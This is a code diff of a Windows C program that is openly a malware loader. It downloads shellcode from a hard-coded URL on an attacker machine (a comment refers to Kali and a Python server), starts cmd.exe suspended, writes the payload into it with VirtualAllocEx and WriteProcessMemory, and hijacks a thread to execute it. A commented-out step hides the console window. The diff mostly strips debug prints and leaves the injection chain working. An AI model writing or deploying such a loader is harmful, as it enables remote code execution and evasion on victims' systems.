@@ -4,7 +4,6 @@
 #include <string.h>
 
 #pragma comment (lib, "Wininet.lib")
-//#pragma warning (disable:4996)
 
 #define PAYLOAD	L"http://192.168.216.130:8080/tests" // CHANGE THIS TO MATCH YOUR KALI and PYTHON SERVER
 #define TARGET_PROCESS		"cmd.exe"
@@ -117,7 +116,7 @@ _EndOfFunction:
 
 
 int main() {
-
+	// This was to disable to terminal
 	//HWND hWnd = GetConsoleWindow();
 	//ShowWindow(hWnd, SW_HIDE);
 
@@ -128,17 +127,8 @@ int main() {
 	if (!GetPayloadFromUrl(PAYLOAD, &Bytes, &Size)) {
 		return -1;
 	}
-	//printf("[i] Bytes : 0x%p \n", Bytes);
-	//printf("[i] Size  : %ld \n", Size);
 
-	/////Printing it
-	//for (int i = 0; i < Size; i++) {
-	//	if (i % 16 == 0)
-	//		printf("\n");
-
-	//	printf("%0.2X ", Bytes[i]);
-	//}
-	//printf("\n\n");
+	//Tests to be sure something was downloaded
 	if (Bytes == NULL || Size == 0) {
 		printf("[!] Payload buffer is invalid.\n");
 		return -1;
@@ -150,20 +140,17 @@ int main() {
 
 	PVOID		pAddress = NULL;
 
-	//printf("[i] Creating \"%s\" Process ... ", TARGET_PROCESS);
 	if (!CreateSuspendedProcess(TARGET_PROCESS, &dwProcessId, &hProcess, &hThread)) {
 		return -1;
 	}
 
 
-	// injecting the payload and getting the base address of it
 
 	if (!InjectShellcodeToRemoteProcess(hProcess, Bytes, Size, &pAddress)) {
 		return -1;
 	}
 
 
-	// performing thread hijacking to run the payload
 	if (!HijackThread(hThread, pAddress)) {
 		return -1;
 	}
@@ -239,7 +226,6 @@ BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, IN PBYTE pShellcode, IN 
 		printf("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
 		return FALSE;
 	}
-	//printf("[i] Allocated Memory At : 0x%p \n", *ppAddress);
 
 
 	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
